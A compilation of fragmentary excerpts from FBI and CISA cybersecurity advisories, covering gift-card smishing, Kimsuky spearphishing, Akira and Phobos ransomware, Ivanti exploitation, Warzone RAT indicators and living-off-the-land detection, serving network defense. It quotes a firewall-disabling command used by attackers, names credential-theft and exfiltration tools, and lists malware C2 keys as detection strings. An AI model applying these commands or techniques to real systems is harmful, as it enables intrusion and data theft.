Cyber Criminals Phishing and Smishing US Retail Corporations for Gift Card Fraud,2024-05-07,2,"{'phishing': 12, 'threats_of_violence': 2, 'malware': 1}","www.fbi.gov/contact-us/field-offices   TLP: CLEAR  TLP: CLEAR  06 May 2024  20240506-001    (U) Cyber Criminals Phishing and Smishing US Retail  Corporations for Gift Card Fraud      Summary  The Federal Bureau of Investigation (FBI) is releasing this Private Industry Notification (PIN) to  highlight cyber criminals’ activity using phishing and Short Message Service (SMS) phishing  (smishing) campaigns against employees at US retail corporate offices in order to create  fraudulent gift cards resulting in financial loss. STORM-0539 used smishing campaigns to target employees and gain  unauthorized access to employee accounts and corporate systems. Once they gained access,  STORM-0539 actors used phishing campaigns to target other employees to elevate network     TLP:CLEAR      TLP: CLEAR   access and target the gift card department in order to create fraudulent gift cards. Some of the  techniques, tactics, and procedures (TTPs) observed by STORM-0539 actors included:   • Targeting a variety of employees’ personal and work mobile phones in retail  departments with smishing campaigns. • Using a sophisticated phishing kit with the ability to bypass multi-factor authentication. STORM-0539 actors continued their smishing attacks and  regained access to corporate systems. In addition, the following mitigation strategies can be considered to help reduce the  risk of and impact from smishing/phishing campaigns. TLP:CLEAR      TLP: CLEAR   Organizational Strategies:  • Provide education and training for employees on how smishing/phishing scams work,  how to identify them, and how to report them. Ensure there is mechanism and process  for employees to report smishing/phishing attacks. When practical, use phishing-resistant authentication options. • Consider using network and end-point SMS filtering and anti-phishing tools. •  Phishing Guidance: Stopping the Attack Cycle at Phase One: CISA Phishing Guidance       TLP:CLEAR      TLP: CLEAR       Reporting Notice  The FBI encourages recipients of this document to report information concerning suspicious or criminal  activity to their local FBI field office or ic3.gov.

Secure by Design Alert: Eliminating Directory Traversal Vulnerabilities in Software,2024-05-02,2,{'threats_of_violence': 4},"CISA and the FBI are releasing this  Secure by Design Alert in response to recent well-publicized threat actor campaigns that exploited directory traversal  vulnerabilities in software (e.g., CVE-2024-1708, CVE-2024-20345) to compromise users of the software—impacting  critical infrastructure sectors, including the Healthcare and Public Health Sector. Additionally, this Alert highlights the prevalence, and continued threat actor exploitation of, directory traversal defects. Approaches to avoid directory traversal vulnerabilities are known, yet threat actors continue to exploit these vulnerabilities  which have impacted the operation of critical services, including hospital and school operations. Executives must consider the full picture: that customers, our economy, and our national security are currently  bearing the brunt of business decisions to not build security into their products—as the threat actor campaigns described  earlier in this Alert clearly reflect."
North Korean Actors Exploit Weak DMARC Security Policies to Mask Spearphishing Efforts,2024-05-02,2,"{'phishing': 14, 'threats_of_violence': 5}","Co-Authored by:  TLP:CLEAR Product ID: JCSA-20240502-001  May 2, 2024                              North Korean Actors Exploit Weak DMARC  Security Policies to Mask Spearphishing Efforts  SUMMARY  The Federal Bureau of Investigation (FBI), the U.S. The North Korean cyber actors have conducted  spearphishing campaigns posing as legitimate journalists, academics, or other experts in East Asian  affairs with credible links to North Korean policy circles. North Korea leverages these spearphishing  campaigns to collect intelligence on geopolitical events, adversary foreign policy strategies, and any  information affecting North Korean interests by gaining illicit access to targets’ private documents,  research, and communications. This Joint Cybersecurity Advisory (CSA) includes indicators of North  Korean social engineering (page 4) for potential victims receiving spearphishing emails as well as  mitigation measures (page 9) for organizations who could be victims of North Korean impersonation. Successful compromises further enable  Kimsuky actors to craft more credible and effective spearphishing emails, which can then be  leveraged against more sensitive, higher-value targets. The authoring agencies seek to bring awareness of these campaigns to degrade or minimize the  effectiveness of Kimsuky spearphishing operations. When an organization securely configures a DMARC policy, it helps ensure  malicious actors, like Kimsuky, are unable to spoof the organization’s legitimate email domain when  sending spearphishing messages to a target. FBI | State | NSA  TLP:CLEAR  Page 3 of 9 | Product ID: JCSA-20240502-001  JCSA 20240502 001 JCSA 502 001 TLP:CLEAR        North Korean cyber actors rely on social engineering techniques such as spearphishing—the use of  fabricated emails tailored to deceive a target—as their primary vector for initiating a compromise and  gaining access to a target’s device and networks. Kimsuky spearphishing campaigns begin with  broad research and preparation, including leveraging open source information to identify potential  targets of value and then creating tailored online personas to appear more realistic and appealing to  their targets. The sample emails beginning on page 5 are real unedited examples of Kimsuky spearphishing  attempts reported to the USG and contain spelling and other errors. If you believe you have been targeted in one of these spearphishing campaigns, whether or  not it resulted in a compromise (particularly if you are a member of one of the targeted  sectors), please file a report with www.ic3.gov and reference #KimsukyCSA in the incident  description. and ROK government employees with high  clearance levels; and members of the military  •  Email accounts that are spoofed with subtle incorrect misspellings of legitimate names and  email addresses listed in a university directory or an official website  •  Malicious documents that require the user to click “Enable Macros” to view the document  •  Follow-up emails within 2-3 days of initial contact if the target does not respond to the initial  spearphishing email  •  Emails purporting to be from official sources but sent using unofficial email services,  identifiable through the email header information being a slightly incorrect version of  an organization’s domain   FBI | State | NSA  TLP:CLEAR  Page 5 of 9 | Product ID: JCSA-20240502-001  JCSA 20240502 001 JCSA 502 001 TLP:CLEAR        Sample Email 1:  Between late 2023 and early 2024, North Korean cyber actors sent the following email to USG  officials and others at international organizations.

The  authoring agencies of this advisory assess the principal goals of North Korea’s regime cyber program  include maintaining consistent access to current intelligence about the United States, South Korea,  and other countries of interest to impede any perceived political, military, or economic threat to the  regime’s security and stability. by drastically  escalating its development of strategic nuclear weapons such as intercontinental ballistic missiles  (ICBMs), but also wielded threats against the Republic of Korea and Northeast Asia in the form of  tactical nuclear weapons development. On this basis, North Korea  has continued to openly pressure the Republic of Korea and the international community, and pose  a real and present threat to security in the Korean Peninsula and across Northeast Asia. CISA and NIST based the  CPGs on existing cybersecurity frameworks and guidance to protect against the most common and  impactful threats, tactics, techniques, and procedures. In order for organizations to make their policy stricter and signal to  email servers to consider unauthenticated emails as spam, the authoring agencies recommend  mitigating this threat by updating your organization’s DMARC policy to one of these two  configurations:  •  “v=DMARC1; p=quarantine;”  “p=quarantine” indicates that email servers should quarantine emails that fail DMARC, considering  them to be probable spam."
Defending OT Operations Against Ongoing Pro-Russia Hacktivist Activity,2024-05-01,2,{'threats_of_violence': 9},"Overview of Threat Actor Activity  Pro-Russia hacktivist activity against these sectors appears mostly limited to unsophisticated techniques that manipulate  ICS equipment to create nuisance effects. However, investigations have identified that these actors are capable of  techniques that pose physical threats against insecure and misconfigured OT environments. CISA and NIST based the CPGs on  existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics,  techniques, and procedures. To safeguard against this threat, the authoring organizations urge organizations to:  Harden HMI Remote Access  •  Disconnect all HMIs, such as the touchscreens used to monitor or make changes to the system, or  programmable logic controllers (PLCs), from the public-facing internet. The allowlist can be refined to specific  times of the day to further obstruct malicious threat actor activity; organizations are encouraged to establish  alerting for monitoring access attempts. o  Note: An allowlist is not a complete security solution by itself but may increase the level of effort necessary  for a threat actor to compromise a device. •  Be aware of cyber/physical-enabled threats. organizations can utilize a range of CISA services at no cost, including scanning and  testing, to help organizations reduce exposure to threats by mitigating attack vectors. The use of default credentials is a top weakness that threat  actors exploit to gain access to systems."

These #StopRansomware advisories include recently  and historically observed tactics, techniques, and  procedures (TTPs) and indicators of compromise (IOCs)  to help organizations protect against ransomware. Visit  stopransomware.gov to see all #StopRansomware  advisories and to learn more about other ransomware  threats and no-cost resources. The United States’ Federal Bureau of Investigation  (FBI), Cybersecurity and Infrastructure Security Agency  (CISA), Europol’s European Cybercrime Centre (EC3), and the Netherlands’ National Cyber Security  Centre (NCSC-NL) are releasing this joint CSA to disseminate known Akira ransomware IOCs and  TTPs identified through FBI investigations as recently as February 2024 and trusted third party  reporting. Since March 2023, Akira ransomware has impacted a wide range of businesses and critical  infrastructure entities in North America, Europe, and Australia. As of January 1, 2024, the ransomware group has impacted over 250 organizations and  claimed approximately $42 million USD in ransomware proceeds. Early versions of the Akira ransomware variant were written in C++ and encrypted files with a .akira  extension; however, beginning in August 2023, some Akira attacks began deploying Megazord, using  Rust-based code which encrypts files with a .powerranges extension. Actions to take today to mitigate cyber  threats from Akira ransomware:  •  Prioritize remediating known exploited  vulnerabilities. FBI | CISA | EC3 | NCSC-NL TLP:CLEAR Page 2 of 14  |  Product ID: AA24-109A  TLP:CLEAR  The FBI, CISA, EC3, and NCSC-NL encourage organizations to implement the recommendations in  the Mitigations section of this CSA to reduce the likelihood and impact of ransomware incidents. Defense Evasion  Based on trusted third party investigations, Akira threat actors have been observed deploying two  distinct ransomware variants against different system architectures within the same compromise  event. Akira threat actors were first  observed deploying the Windows-specific “Megazord” ransomware, with further analysis revealing  that a second payload was concurrently deployed in this attack (which was later identified as a novel  variant of the Akira ESXi encryptor, “Akira_v2”).

Network segmentation can help  prevent the spread of ransomware by controlling traffic flows between—and access to— various subnetworks and by restricting adversary lateral movement [CPG 2.F]. •  Identify, detect, and investigate abnormal activity and potential traversal of the  indicated ransomware with a networking monitoring tool. To aid in detecting the  ransomware, implement a tool that logs and reports all network traffic, including lateral  movement activity on a network.

Furthermore, payment may also embolden adversaries to  target additional organizations, encourage other criminal actors to engage in the distribution of  ransomware, and/or fund illicit activities. Regardless of whether you or your organization have  decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to  the FBI’s Internet Crime Complain Center (IC3), a local FBI Field Office, or CISA via the agency’s  Incident Reporting System or its 24/7 Operations Center (report@cisa.gov or (888) 282-0870). In April 2023, following an initial focus  on Windows systems, Akira threat actors deployed a Linux variant targeting VMware ESXi virtual  machines. Akira threat actors have  continued to use both Megazord and Akira, including Akira_v2 (identified by trusted third party  investigations) interchangeably. In some instances,  the FBI identified Akira threat actors creating an administrative account named itadm. According to FBI and open source reporting, Akira threat actors leverage post-exploitation attack  techniques, such as Kerberoasting[5], to extract credentials stored in the process memory of the  Local Security Authority Subsystem Service (LSASS) [T1003.001].[6] Akira threat actors also use  credential scraping tools [T1003] like Mimikatz and LaZagne to aid in privilege escalation.

Cybersecurity researchers have observed Akira threat actors using PowerTool to exploit  the Zemana AntiMalware driver[4] and terminate antivirus-related processes [T1562.001]. Exfiltration and Impact  Akira threat actors leverage tools such as FileZilla, WinRAR [T1560.001], WinSCP, and RClone to  exfiltrate data [T1048]. To establish command and control channels, threat actors leverage readily  available tools like AnyDesk, MobaXterm, RustDesk, Ngrok, and Cloudflare Tunnel, enabling  exfiltration through various protocols such as File Transfer Protocol (FTP), Secure File Transfer  Protocol (SFTP), and cloud storage services like Mega [T1537] to connect to exfiltration servers. The Akira ransom note provides each company with a unique code and instructions  to contact the threat actors via a .onion URL. Akira threat actors do not leave an initial ransom  demand or payment instructions on compromised networks, and do not relay this information until  contacted by the victim. Ransom payments are paid in Bitcoin to cryptocurrency wallet addresses  provided by the threat actors. To further apply pressure, Akira threat actors threaten to publish  exfiltrated data on the Tor network, and in some instances have called victimized companies,  according to FBI reporting. Encryption  Akira threat actors utilize a sophisticated hybrid encryption scheme to lock data.

Threat Actors Exploit Multiple Vulnerabilities in Ivanti Connect Secure and Policy Secure Gateways,2024-03-01,1,"{'phishing': 1, 'threats_of_violence': 27, 'malware': 1}","o Apply phishing-resistant multifactor authentication (MFA). Co-Authored by:  Product ID: AA24-060B February 29, 2024  TLP:CLEAR   TLP:CLEAR  Threat Actors Exploit Multiple Vulnerabilities in  Ivanti Connect Secure and Policy Secure Gateways  SUMMARY  The Cybersecurity and Infrastructure Security Agency  (CISA) and the following partners (hereafter referred to as  the authoring organizations) are releasing this joint  Cybersecurity Advisory to warn that cyber threat actors  are exploiting previously identified vulnerabilities in Ivanti  Connect Secure and Ivanti Policy Secure gateways. Authoring organizations:  •  Federal Bureau of Investigation (FBI)  •  Multi-State Information Sharing & Analysis Center (MS-ISAC)  •  Australian Signals Directorate’s Australian Cyber Security Centre (ASD’s ACSC)  •  United Kingdom National Cyber Security Centre (NCSC-UK)  •  Canadian Centre for Cyber Security (Cyber Centre), a part of the Communications Security  Establishment  •  New Zealand National Cyber Security Centre (NCSC-NZ)  •  CERT-New Zealand (CERT NZ)  Of particular concern, the authoring organizations and industry partners have determined that cyber  threat actors are able to deceive Ivanti’s internal and external Integrity Checker Tool (ICT), resulting in  a failure to detect compromise. Actions to take today to mitigate cyber  threats against Ivanti appliances:  •  Limit outbound internet connections  from SSL VPN appliances to restrict  access to required services. Page 2 of 29  |  Product ID: AA24-060B  TLP:CLEAR   TLP:CLEAR  Cyber threat actors are actively exploiting multiple previously identified vulnerabilities—CVE-2023- 46805, CVE-2024-21887, and CVE-2024-21893—affecting Ivanti Connect Secure and Ivanti Policy  Secure gateways. The vulnerabilities impact all supported versions (9.x and 22.x) and can be used in  a chain of exploits to enable malicious cyber threat actors to bypass authentication, craft malicious  requests, and execute arbitrary commands with elevated privileges. In addition, CISA has  conducted independent research in a lab environment validating that the Ivanti ICT is not sufficient to  detect compromise and that a cyber threat actor may be able to gain root-level persistence despite  issuing factory resets. Based upon the authoring organizations’ observations during incident response activities and  available industry reporting, as supplemented by CISA’s research findings, the authoring  organizations recommend that the safest course of action for network defenders is to assume a  sophisticated threat actor may deploy rootkit level persistence on a device that has been reset and lay  dormant for an arbitrary amount of time. See the MITRE  ATT&CK Tactics and Techniques in Appendix C for a table of the threat actors’ activity mapped to  MITRE ATT&CK tactics and techniques. Volexity identified that threat actors exploited the vulnerabilities to implant web shells,  including GLASSTOKEN and GIFTEDVISITOR, on internal and external-facing web servers  [T1505.003]. Once successfully deployed, these web shells are used to execute commands on  compromised devices.[1]  After Ivanti provided initial mitigation guidance in early January, threat actors developed a way to  bypass those mitigations to deploy BUSHWALK, LIGHTWIRE, and CHAINLINE web shell variants.[2]  Following the actors’ developments, Ivanti disclosed three additional vulnerabilities:  •  CVE-2024-21893 is a server-side request forgery vulnerability in the SAML component of  Ivanti Connect Secure (9.x, 22.x) Ivanti Policy Secure (9.x, 22.x), and Ivanti Neurons for ZTA  that allows an attacker to access restricted resources without authentication. This vulnerability allows threat actors to gain  elevated privileges to that of an administrator. Observed Threat Actor Activity  CISA has responded to multiple incidents related to the above vulnerabilities in Ivanti Connect Secure  and Policy Secure Gateways. As detailed in Appendix A, CISA conducted independent research in a lab environment validating that  the ICT is likely insufficient for detecting compromise and that a cyber threat actor may be able to  maintain root level persistence despite issuing factory resets and appliance upgrades. Activity should not be attributed as malicious without analytical evidence to  support it is used at the direction of, or controlled by, threat actors. If compromise is suspected or detected, organizations should assume that threat  actors hold full administrative access and can perform all tasks associated with the Ivanti Connect  Secure VPN appliance as well as executing arbitrary code and installing malicious payloads. Identify Ivanti hosts with Active Directory (AD) access, threat actors can trivially export active  domain administrator credentials during initial compromise. ▪  Note: Removing malicious administrator accounts may not fully mitigate risk considering  threat actors may have established additional persistence mechanisms. (See the Reporting section.)             Page 6 of 29  |  Product ID: AA24-060B  TLP:CLEAR   TLP:CLEAR  MITIGATIONS  The authoring organizations recommend organizations  implement the mitigations below to improve your  cybersecurity posture based on threat actor activity and  to reduce the risk of compromise associated with Ivanti  vulnerabilities. CISA and  NIST based the CPGs on existing cybersecurity  frameworks and guidance to protect against the most  common and impactful threats, tactics, techniques, and  procedures. These  principles and tactics can limit the impact of  exploitation—such as threat actors  leveraging newly discovered, unpatched  vulnerabilities within Ivanti appliances— thus, strengthening the secure posture for  their customers. Timely patching is one of  the most efficient and cost-effective steps an organization can take to minimize its exposure to  cybersecurity threats.

In addition, the authoring authorities of this CSA recommend network defenders apply the following  mitigations to limit potential adversarial use of common system and network discovery techniques, and  to reduce the impact and risk of compromise by ransomware or data extortion actors:  •  Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary  data and servers in a physically separate, segmented, and secure location (i.e., hard drive,  storage device, or the cloud). Product ID: AA24-060A February 29, 2024 Co-Authored by:  TLP:CLEAR TLP:CLEAR  #StopRansomware: Phobos Ransomware  SUMMARY  Note: This joint Cybersecurity Advisory (CSA) is part of  an ongoing #StopRansomware effort to publish  advisories for network defenders that detail various  ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently  and historically observed tactics, techniques, and  procedures (TTPs) and indicators of compromise  (IOCs) to help organizations protect against  ransomware. Visit stopransomware.gov to see all  #StopRansomware advisories and to learn more about  other ransomware threats and no-cost resources. The Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency  (CISA), and the Multi-State Information Sharing and Analysis Center (MS-ISAC) are releasing this  joint CSA, to disseminate known TTPs and IOCs associated with the Phobos ransomware variants  observed as recently as February 2024, according to open source reporting. Phobos is structured as  a ransomware-as-a-service (RaaS) model. Since May 2019, Phobos ransomware incidents impacting  state, local, tribal, and territorial (SLTT) governments have been regularly reported to the MS-ISAC. dollars.[1],[2]  The FBI, CISA, and the MS-ISAC encourage organizations to implement the recommendations in the  Mitigations section of this CSA to reduce the likelihood and impact of Phobos ransomware and other  ransomware incidents. For a downloadable copy of indicators of compromise (IOCs), see:  •  AA24-060A (STIX XML, 148KB)  •  AA24-060A (STIX JSON, 120KB)  Actions to take today to mitigate  Phobos ransomware activity:  •  Secure RDP ports to prevent threat  actors from abusing and leveraging  RDP tools. Overview  According to open source reporting, Phobos ransomware is likely connected to numerous variants  (including Elking, Eight, Devos, Backmydata, and Faust ransomware) due to similar TTPs observed in  Phobos intrusions. Phobos ransomware operates in conjunction with various open source tools such  as Smokeloader, Cobalt Strike, and Bloodhound. Additional Phobos Defense Evasion Capabilities  Phobos ransomware actors have been observed bypassing organizational network defense protocols  by modifying system firewall configurations using commands like netsh firewall set opmode  mode=disable [T1562.004]. Persistence and Privilege Escalation  According to open source reporting, Phobos ransomware uses commands such as Exec.exe or the  bcdedit[.]exe control mechanism. Furthermore, Phobos ransomware is able to enumerate connected storage devices [T1082], running  processes [T1057], and encrypt user files [T1083]. Each Phobos ransomware executable has unique build identifiers (IDs), affiliate IDs, as well as a  unique ransom note which is embedded in the executable. After the ransom note has populated on  infected workstations, Phobos ransomware continues to search for and encrypt additional files.

Malicious File  T1204.002  Phobos actors attached a malicious email  attachment to deliver ransomware. Table 14: Phobos Threat Actors ATT&CK Techniques for Enterprise – Persistence  Technique Title  ID  Use  Registry Run Keys / Startup  Folder  T1547.001  Phobos ransomware operates using the  Exec.exe control mechanism and has been  observed using Windows Startup folders and Run  Registry Keys. Asynchronous Procedure Call  T1055.004  During phase two of execution, Phobos  ransomware sends a call back from an identified  entry point. Embedded Payloads  T1027.009  Phobos actors embedded the ransomware as a  hidden payload by using Smokeloader. Disable or Modify System  Firewall  T1562.004  Phobos ransomware has been observed  bypassing organizational network defense  protocols through modifying system firewall  configurations. Table 18: Phobos Threat Actors ATT&CK Techniques for Enterprise – Discovery  Technique Title  ID  Use  Process Discovery  T1057  Phobos ransomware is able to run processes. System Information Discovery  T1082  Phobos ransomware is able to enumerate  connected storage devices. File and Directory Discovery  T1083  Phobos ransomware can encrypt user files. Ingress Tool Transfer  T1105  Phobos ransomware extracts its final payload  from the hashed file. The FBI,  CISA, and MS-ISAC recommend that software  manufacturers incorporate secure by design and  default principles and tactics into their software  development practices limiting the impact of  ransomware techniques, thus, strengthening the  secure posture for their customers. •  Segment networks to prevent the spread of ransomware. Network segmentation can help  prevent the spread of ransomware by controlling traffic flows between—and access to— various subnetworks and by restricting adversary lateral movement [CPG 2.F]. •  Identify, detect, and investigate abnormal activity and potential traversal of the  indicated ransomware with a networking monitoring tool. To aid in detecting the  ransomware, implement a tool that logs and reports all network traffic and activity, including  lateral movement, on a network.

Furthermore, payment may also embolden adversaries to target additional  organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or  fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom,  the FBI and CISA urge you to promptly report ransomware incidents to the FBI Internet Crime  Complaint Center (IC3), a local FBI Field Office, or to CISA at report@cisa.gov or (888) 282-0870. •  Implement EDR solutions to disrupt  threat actor memory allocation  techniques. See the MITRE  ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE  ATT&CK® tactics and techniques. Threat actors leveraging Phobos have notably  deployed remote access tools to establish a remote connection within the compromised network  [T1219].[7]  Alternatively, threat actors send spoofed email attachments [T1566.001] that are embedded with  hidden payloads [T1204.002] such as SmokeLoader, a backdoor trojan that is often used in  conjunction with Phobos. After SmokeLoader’s hidden payload is downloaded onto the victim’s  system, threat actors use the malware’s functionality to download the Phobos payload and exfiltrate  data from the compromised system. The Windows command shell enables threat  actors to control various aspects of a system, with multiple permission levels required for different  subsets of commands [T1059.003][T1105].[8]             FBI | CISA | MS-ISAC   Page 3 of 18  |  Product ID: AA24-060A  TLP:CLEAR  TLP:CLEAR Smokeloader Deployment  Phobos operations feature a standard three phase process to decrypt a payload that allows the threat  actors to deploy additional destructive malware.[9]  For the first phase, Smokeloader manipulates either VirtualAlloc or VirtualProtect API  functions—which opens an entry point, enabling code to be injected into running processes and  allowing the malware to evade network defense tools [T1055.002]. Finally, once Smokeloader reaches its third stage, it unpacks a program-erase cycle from stored  memory, which is then sent to be extracted from a SHA 256 hash as a payload.[7] Following  successful payload decryption, the threat actors can begin downloading additional malware. Table 10: Phobos Threat Actors ATT&CK Techniques for Enterprise – Reconnaissance  Technique Title  ID  Use  Search Open  Websites/Domains  T1593  Phobos actors perform open source research to  find information about victims that can be used  during targeting to create a victim profile. Table 11: Phobos Threat Actors ATT&CK Techniques for Enterprise – Resource Development  Technique Title  ID  Use  Establish Accounts  T1585  Phobos actors establish accounts to  communicate. Table 12: Phobos Threat Actors ATT&CK Techniques for Enterprise – Initial Access  Technique Title  ID  Use  Valid Accounts  T1078  Following successful RDP authentication,  Phobos actors search for IP addresses and pair  them with their associated computer to create a  victim profile. Table 13: Phobos Threat Actors ATT&CK Techniques for Enterprise – Execution  Technique Title  ID  Use  Windows Management  Instrumentation  T1047  Phobos actors used Windows Management  Instrumentation command-line utility (WMIC) to  prevent victims from recovering files. Table 15: Phobos Threat Actors ATT&CK Techniques for Enterprise – Privilege Escalation  Technique Title  ID  Use  Privilege Escalation  TA0004  Phobos actors use run commands like  1saas.exe, or cmd.exe to deploy additional  Phobos payloads with escalated privileges. Table 16: Phobos Threat Actors ATT&CK Techniques for Enterprise – Defense Evasion  Technique Title  ID  Use  Software Packing  T1027.002  Phobos actors deployed a portable executable  (PE) to conceal code.

Exfiltration to Cloud Storage  T1567.002  Phobos threat actors use Mega.io to exfiltrate  data to a cloud storage service rather than over  their primary command and control channel. Table 22: Phobos Threat Actors ATT&CK Techniques for Enterprise – Impact  Technique Title  ID  Use  Data Encrypted for Impact  T1486  Phobos threat actors use the Phobos.exe  command to encrypt data on all logical drives  connected to the network. Inhibit System Recovery  T1490  Phobos threat actors may delete or remove  backups to include volume shadow copies from  Windows environments to prevent victim data  recovery response efforts. Financial Theft  T1657  Phobos threat actor’s extort victims for financial  gain. CISA and NIST  based the CPGs on existing cybersecurity  frameworks and guidance to protect against the most common and impactful threats, tactics,  techniques, and procedures. •  Implement log collection best practices and use intrusion detection systems to defend  against threat actors manipulating firewall configurations through early detection [CPG 2.T]. o Implement EDR solutions to disrupt threat actor memory allocation techniques. •  Reduce the threat of credential compromise via the following:  o Place domain admin accounts in the protected users’ group to prevent caching of  password hashes locally. VALIDATE SECURITY CONTROLS  In addition to applying mitigations, the FBI, CISA, and MS-ISAC recommend exercising, testing, and  validating your organization's security program against the threat behaviors mapped to the MITRE  ATT&CK for Enterprise framework in this advisory.

ACKNOWLEDGEMENTS  Mandiant and Microsoft Threat Intelligence contributed to this advisory. Department of Justice, including the FBI, and international partners recently disrupted a  GRU botnet consisting of such routers. An FBI investigation revealed APT28 actors accessed EdgeRouters compromised by Moobot, a  botnet that installs OpenSSH trojans on compromised hardware [T1588]. Trojanized OpenSSH server processes are associated with Moobot, a Mirai- based botnet that infects internet of things (IoT) devices using remotely exploitable vulnerabilities,  such as weak or default passwords.

TLP: CLEAR  TLP: CLEAR  15 February 2024  MU-000174-MW    Identification and Disruption of the Warzone Remote  Access Trojan (RAT)      Summary  The Federal Bureau of Investigation (FBI) is releasing this FLASH to disseminate indicators of  compromise (IOCs) and tactics, techniques, and procedures (TTPs) associated with the Warzone  Remote Access Trojan (RAT), also identified as “Ave Maria” through open-source reporting and  FBI investigation. Beginning in October 2018, the Warzone service offered a malware-as-a-service (MaaS) remote  access trojan, along with other malware products and attracted a customer database of over  7,000 users. The Warzone service offered multiple associated malware products, including a premium RAT  called “Poison” with advanced features such as a rootkit to hide processes, files, and startup;  premium customer support; and premium Dynamic Domain Name System (DDnS) services. The Microsoft  exploits, which allowed malware to be embedded into a .doc or Excel file, exploited the  reported Common Vulnerabilities and Exposures (CVEs), in particular CVE-2017-8570, CVE- 2017-11882, and CVE-2018-0802. The  malware was often also distributed with or through malicious Microsoft Office files (T1221),  which exploit Microsoft CVE-2017-11882, a CVE that has been in multiple Top Routinely  Exploited Vulnerabilities reports coauthored by the Cybersecurity and Infrastructure Security  Agency’s (CISA), the FBI, the NSA and FVEY partners. Persistence       During installation, the malware gains persistence by copying itself to  C:\Users\User\AppData\Roaming\ and creating a registry key with a value set to the location of  Warzone’s executable binary to enable automatic execution of the code after each machine  reboot. Communication      The malware communicates with C2 servers via TCP over a configurable port which defaults to  port 5200. Variations in the C2  communications could be attributable to the progressive versions of the malware sold by the  developers. After decrypting the communication and connecting with the C2 server, the  malware collects basic system information about the compromised host, such as PC name and  operating system, and sends it back to the C2 server. Indicators of Compromise  The following are strings that can be used to identify and detect unpacked Warzone payload  inside memory:     •  “warzone160\x00”   o Encryption password/key for communication with C2 server   •  “Ave_Maria Stealer”   o String in the binary code of the RAT   •  “nevergonnagiveyouup”   o Encryption password/key for communication with C2 server      The following are other embedded communication passwords identified through the FBI’s  analysis of data associated with the malware:   •  “warzoneTURBO”  •  “MushroomFunguy”  •  “doghoroscopes”           Recommended Mitigations:  The FBI recommends network defenders apply the following mitigations to limit potential  adversarial use of common system and network discovery techniques and to reduce the risk of  compromise:  Preparing for Cyber Incidents:  • Maintain offline backups of data, and regularly maintain backup and restoration. Protective Controls and Architecture:  • Segment networks to prevent the spread of malware or actor traversal. Network  segmentation can help prevent the spread of malware by controlling traffic flows  between, and access to, various subnetworks and by restricting adversary lateral  movement. To aid in detecting malware and actor activity,  implement a tool that logs and reports all network traffic, including lateral  movement activity on a network."

The authoring agencies have observed cyber threat actors, including the People’s Republic  of China (PRC) [1],[2] and Russian Federation [3] state-sponsored actors, leveraging LOTL  techniques to compromise and maintain persistent access to critical infrastructure  organizations. The authoring agencies are releasing this joint guide for network defenders  (including threat hunters) as the malicious use of LOTL techniques is increasingly emerging  in the broader cyber threat environment. Cyber threat actors leveraging LOTL abuse native tools and processes on systems, often  using “living off the land binaries.” They use LOTL in multiple IT environments, including on- premises, cloud, hybrid, Windows, Linux, and macOS environments. LOTL enables threat  actors to conduct their operations discreetly as they can camouflage activity with typical  system and network behavior, potentially circumventing basic endpoint security capabilities. TLP:CLEAR        3  TLP:CLEAR  • It enables cyber threat actors to avoid investing in developing and deploying custom  tools. In many cases, software  defects or unsecure default configurations allow cyber threat actors to carry out malicious  cyber activity using LOTL techniques. 37       TLP:CLEAR        6  TLP:CLEAR  Introduction  The authoring agencies are releasing this joint guide to warn network defenders that cyber  threat actors, including PRC [1],[2] and Russian Federation [3] state-sponsored actors, are  leveraging living off the land (LOTL) techniques to compromise and maintain persistence in  critical infrastructure organizations. This guide provides information for network defenders—including threat hunters—on LOTL,  network defense weaknesses that enable actors to use LOTL undetected, and detection  guidance. • Authoring agency incident response engagements, including a recent CISA incident  response engagement where cyber threat actors had persistent, long-term access to  the victim’s environment and compromised the domain controller (DC). Cyber threat actors effectively use  LOTL across multiple environments, including in on-premises, cloud, hybrid, Windows, Linux,  and macOS environments, in part because it enables the ability to avoid investing in the  development and deployment of custom tools. Authoring agency incident response teams predominantly observe cyber threat actors  leverage LOTL in Windows environments due to the operating system’s widespread use in  corporate and enterprise settings. In Windows environments, cyber threat actors use native  tools, services, and features, relying on the fact that these components are ubiquitous and  generally trusted. In macOS environments, LOTL is also referred to as “living off the orchard.” Malicious actors  exploit native scripting environments, built-in tools, system configurations, and binaries  referred to as “LOOBins.” In hybrid environments, cyber threat actors are increasingly   TLP:CLEAR        7  TLP:CLEAR  exploiting both physical and cloud-based systems by leveraging sophisticated LOTL  techniques. In addition to LOLBins, cyber threat actors similarly use third-party remote access software,  e.g., remote monitoring and management, endpoint configuration management, EDR, patch  management, mobile device management systems, and database management tools. In large organizations, investigations may take  several months, during which cyber threat actors expand their access. o Threat actors can easily modify known IOCs, such as filenames and command  line arguments, or modify content to change the hash. Cyber threat actors bypass  conventional, “known-bad"" detections by modifying common IOCs such as  filenames, file paths, and command and control destinations. Identify and  prioritize essential IP ranges for organizational operations, apply selective  restrictions on others, and routinely review and update allowlists for adaptability  and security against emerging threats. This dynamic can cause system administrators to prioritize Windows   TLP:CLEAR        10 TLP:CLEAR  over macOS when hunting threats. Configure  These recommendations are not foolproof  but are part of a multi-faceted and  comprehensive approach to mitigating  LOTL cyber threats. Cyber  threat actors may take advantage of unused services or regions that are  not actively monitored to avoid detection. Log aggregation is critical because some cyber  threat actors are known to clear or modify local system event logs. Enhance network monitoring, log retention, and threat hunting to identify  prolonged adversary presence. Extending log storage, fine-tuning anomaly  detection, and deepening threat hunting tactics can help uncover threat actors  leveraging LOTL techniques over immediate and extended dwell periods. These accounts are  targets for threat actors because they frequently have additional, unnecessary  privileges and do not utilize multi-factor authentication (MFA). If the host does not require a specific piece of software, uninstall it to  limit the tools available to cyber threat actors. Cyber threat actors who obtain an initial foothold through exploitation of internet- facing services frequently rely on LOLBins for initial execution, reconnaissance,  and deployment of secondary payloads. Refine monitoring tools and alerting mechanisms to differentiate  between typical administrative actions and potential threat behavior. Consider implementing a threat detection maturity model to develop, implement,  test, and tune alerting mechanisms enabled within network and host intrusion  detection systems or SIEM. Leverage user and entity behavior analytics (UEBA) to analyze and correlate activities  across multiple data sources, to identify potential security incidents that may be  missed by traditional tools, and to profile and monitor user behavior, detecting  insider threats or compromised accounts. If a  threat actor compromises a host with cached credentials, the actor can often find  and 